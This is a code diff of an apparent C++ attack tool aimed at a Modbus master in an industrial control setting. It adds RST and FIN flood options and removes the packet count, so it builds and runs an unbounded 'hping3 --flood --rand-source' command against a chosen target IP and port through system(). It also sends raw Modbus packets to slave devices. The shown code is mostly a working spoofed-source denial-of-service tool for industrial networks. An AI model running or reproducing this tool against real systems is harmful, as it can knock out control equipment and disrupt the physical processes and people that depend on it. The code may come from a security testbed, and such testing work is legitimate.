@@ -38,9 +38,9 @@ string floodAttackString[ENDOFENUM-1]={"FLOOD",
                                        "PACKETSPERSEC",
                                        };
 
-string cyberAttackString[FIN]={"Block Communication towards Master.",
+string cyberAttackString[FIN]={  "Block Communication towards Master.",
                                  "Unblock Traffic towards Master.",
-                                 "Execute SYN Flood attack towards Modbus Master.",
+                                 "Execute SYN attack towards Modbus Master.",
                                  "Execute a TCP RST attack towards Modbus Master.",
 				 "Send a Modbus packet towards Modbus Master. ",
                                  "Execute a TCP FIN attack towards Modbus Master. "
@@ -61,7 +61,7 @@ void unblockTraffic(const string ip, const string port);
 
 // TCP flood functions
 void floodAttacks(const string attackType);
-tcpfloodattacktypes selectTcpSynFloodAttack(void);
+tcpfloodattacktypes selectFloodAttack(void);
 
 //Modbus packet generation function
 void sendModbusPacket(void);
@@ -78,26 +78,21 @@ int main(int argv,char *argc[])
 
 void displayOptions(void)
 {
-   //cout<<globalDisplayString;
-   //int inputOption=-1;
    displayGlobalAttackTypes();
    int inputOption=0;
    string inputStr="";
    while(1)
    {
-      //cout<<"Please enter a selection to continue ::";
       print("Please enter a selection to continue ::");
       getline(cin,inputStr);
       stringstream inputStream(inputStr);
       if( !(inputStream >> inputOption) )
       {
-        //cout<<"Invalid input"<<endl;
         print("Invalid input"<<endl);
         continue;
       }   
       else
       {
-        //cout<<"Valid input"<<endl;
         if(validateInput(inputOption))
         {
            print("Valid input"<<endl);
@@ -150,6 +145,7 @@ void processInput(int inputOption)
           floodAttacks("S");
           break;
        case RST:
+          floodAttacks("R");
           print("RST TRAFFIC"<<endl);
           break;
        case MODBUSPKT:
@@ -157,6 +153,7 @@ void processInput(int inputOption)
           sendModbusPacket();
           break;
        case FIN:
+          floodAttacks("F");
           print("FIN TRAFFIC"<<endl);
           break;
        default:
@@ -201,7 +198,7 @@ void unblockTraffic(const string ip,const string port)
 void floodAttacks(const string attackType)
 {
     
-   tcpfloodattacktypes tcpAttackType = selectTcpSynFloodAttack();
+   tcpfloodattacktypes tcpAttackType = selectFloodAttack();
    print("Flood Attack Type" << tcpAttackType<<endl);
    string packetCount="",packetSize="",port="",targetIP="",packetPerSec="",packetDuration="";
    print("Input the size of each packet to send :: ");
@@ -216,10 +213,8 @@ void floodAttacks(const string attackType)
    {
       case FLOOD:
       {
-         print("Input the number of packets to send :: ");
-         getline(cin,packetCount);
-         commandStr= "hping3 -c " + packetCount + 
-                      " -d " + packetSize + " -" + attackType +
+         commandStr= "hping3  -d " 
+                      + packetSize + " -" + attackType +
                       " -w 64 -p " + port +
                       " --flood --rand-source " + targetIP;
       }       
@@ -280,7 +275,7 @@ void floodAttacks(const string attackType)
   system(commandStr.c_str());
                       
 }
-tcpfloodattacktypes selectTcpSynFloodAttack(void)
+tcpfloodattacktypes selectFloodAttack(void)
 {
   
   string displayStr="";
@@ -292,7 +287,7 @@ tcpfloodattacktypes selectTcpSynFloodAttack(void)
    displayStr += numstr + "."+floodAttackString[i]+" \n";
   }
   print(displayStr);
-  print("Select the type of SYN Flood attack to carry out :: ");
+  print("Select the type of attack to carry out :: ");
   string inputStr="";
   getline(cin,inputStr);
   stringstream inputStream(inputStr);
@@ -321,7 +316,6 @@ void sendModbusPacket(void)
   modbus_t *mb;
   modbus_t *mb2;
   uint16_t tab_reg[32];
-  //std::string modbusSlave=argc[1];
   std::string modbusSlave1,modbusSlave2;
   int modbusPort1=0,modbusPort2=0;
   string inputStr="";
